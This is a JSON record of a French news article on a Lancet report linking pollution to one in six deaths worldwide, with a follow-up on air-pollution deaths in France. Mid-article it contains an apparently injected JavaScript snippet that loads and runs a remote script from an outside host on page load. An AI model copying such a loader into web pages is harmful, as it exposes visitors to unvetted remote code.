{"title": "La pollution responsable d'un mort sur six dans le monde", "newspaper": "Futura Sciences", "author": "AFP-Paris (France)", "date_publi": "23/10/2017", "content": "Trois fois plus que le Sida, quinze fois plus que les guerres : la pollution est un  serial killer , conclut l'étude mondiale parue dans la revue médicale  The Lancet . Et les populations pauvres sont davantage touchées. Des chiffres accablants qui devraient inciter à l'action. Un décès sur six survenu en 2015 dans le monde était lié à la pollution, essentiellement à la contamination de l' air , mais aussi de l'eau et des lieux de travail, estime un rapport publié vendredi dans la revue  The Lancet .  « On estime que les maladies causées par la pollution ont été responsables de neuf millions de morts prématurées en 2015, soit 16 % de l'ensemble des décès dans le monde » , évalue ce rapport, issu de deux ans de travail d'une commission associant la revue médicale britannique, plusieurs organismes internationaux, des ONG et une quarantaine de chercheurs spécialisés dans les questions de santé et d'environnement. Ce bilan représente  « trois fois plus de morts que le Sida, la tuberculose et le paludisme réunis, et quinze fois plus que ceux causés par les guerres et toutes les autres formes de violence » , soulignent ses auteurs. La  pollution de l'air  (extérieur et intérieur) est responsable à elle seule de 6,5 millions de décès chaque année, principalement à travers des maladies non transmissibles comme les maladies cardiaques, les AVC, le cancer du poumon et la broncho-pneumopathie chronique obstructive. L' eau polluée  serait liée à 1,8 million de morts, par exemple  via  un mauvais assainissement ou la contamination des sources, causes de maladies gastro-intestinales et d'infections parasitaires. La pollution sur le lieu de travail en causerait environ 800.000,  via  l'exposition à des substances toxiques ou cancérigènes. La revue  The Lancet  appelle à « s'attaquer d'urgence à la situation » et à battre en brèche « le mythe selon lequel la pollution serait une conséquence inévitable du développement économique » .© Ross Helen, Istock                               La pollution tue plus les pauvres Cette évaluation est  « probablement sous-estimée » , ajoute  The Lancet , compte tenu  « des nombreux polluants chimiques émergents qui restent encore à identifier » . Le phénomène touche en premier lieu  « les populations pauvres et vulnérables » , note le rapport. 92 % de ces décès surviennent en effet dans des pays à revenu faible ou moyen et, dans chaque pays, ils concernent davantage les minorités et les populations marginalisées. Dans les pays en voie d'industrialisation rapide, comme la  Chine , l'Inde, le Kenya, Madagascar ou le Pakistan, jusqu'à un décès sur quatre pourrait être lié à la pollution.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le rapport insiste aussi sur le poids économique de ces  vies écourtées  pour les pays concernés : plus de 4.600 milliards de dollars chaque année (3.900 milliards d'euros), soit l'équivalent de 6,2 % de la richesse économique mondiale. Or, ce fardeau reste  « négligé tant par les gouvernements que par les organisations pour le développement » , déplore  The Lancet  dans un éditorial accompagnant le rapport. La revue médicale appelle à  « s'attaquer d'urgence à la situation »  et à battre en brèche  « le mythe selon lequel la pollution serait une conséquence inévitable du développement économique » . Pour en savoir plus 48.000 morts par an en France à cause de la pollution de l'air Article de l'AFP publié le 22 juin 2016 La présence de  particules fines  contribue aux  maladies cardiovasculaires , respiratoires, neurologiques et aux  cancers . Conséquence : la pollution de l'air serait la troisième cause de décès évitables en France, après le tabac et l' alcool . Les décès provoqués par cette pollution liée aux activités humaines (transports, industrie, chauffage avec des  énergies fossiles  comme le  fuel ,  agriculture , etc) correspondent à 9 % de la mortalité en France continentale (hors Corse et outre-mer, soit près de 62 millions d'habitants), d'après une étude de  Santé Publique France . Ainsi,  « le fardeau (le poids sanitaire) de la pollution de l'air se situe au troisième rang, derrière celui du tabac (78.000 morts par an) et de l'alcool (49.000 morts) » , souligne le professeur François Bourdillon, directeur général de cet organisme public, selon lequel il s'agit d'une  «  espèce  de mortalité invisible » . Cette  pollution  représente  « une perte d' espérance de vie  pour une personne âgée de 30 ans pouvant dépasser deux ans » , souligne l'étude. La perte d'espérance de vie est, en moyenne, plus élevée dans les grandes villes (15 mois et plus), mais elle n'épargne pas les zones rurales (neuf mois). La carte des concentrations de  particules fines  montre qu'elles sont plus élevées dans de grandes zones urbaines comme la région parisienne, le nord-est de la France et l'axe Lyon-Marseille. En 2012, 7 millions de personnes seraient décédées à cause de la pollution de l'air dans le monde. © Idé                       Les décès dus à la pollution sont en partie évitables Plus de 34.000 de ces 48.000 décès seraient évitables chaque année si l'ensemble des communes de France continentale réussissait à atteindre les niveaux de particules fines des 5 % des communes équivalentes (taille de la population) les moins polluées, d'après un des scénarios retenus par les auteurs de l'étude. Les chiffres de mortalité mentionnés dans cette nouvelle étude ne sont pas en augmentation par rapport à de précédents résultats, note toutefois Sylvia Médina, coordonnatrice du programme Air Santé. L'étude française confirme notamment l'étude européenne Cafe ( Clean air for Europe ) de 2000 qui évaluait à plus de 40.000 le nombre des décès liés à la  pollution  en France. Par ailleurs, les  pics de pollution  pèsent moins sur la santé que l'exposition chronique. L'impact sur la santé résulte, à long terme, surtout de l'exposition au jour le jour à des niveaux de pollution inférieurs aux seuils d'alerte déclenchés à partir d'une concentration de 80 microgrammes de  PM10  (particules de diamètre inférieur à 10  microns ) par mètre cube d'air. L'exposition à la pollution de l'air, notamment aux particules fines, contribue au développement de  maladies cardiovasculaires  (infarctus, etc.), respiratoires ou encore neurologiques, et de cancers. Elle favorise aussi des  « troubles de la reproduction et du développement de l'enfant » , ajoute Sylvia Médina. Playlist : tout savoir sur les maladies pulmonaires avec Paul Hofman                       Durant cette playlist vidéo, Paul Hofman, directeur du laboratoire de pathologie de Nice, nous parle des maladies pulmonaires et des différents risques auxquels nos poumons sont exposés au quotidien. Pollution, cigarette, tabagisme passif et leurs conséquences sont abordés dans ces interviews.                                       ", "theme": "sante"}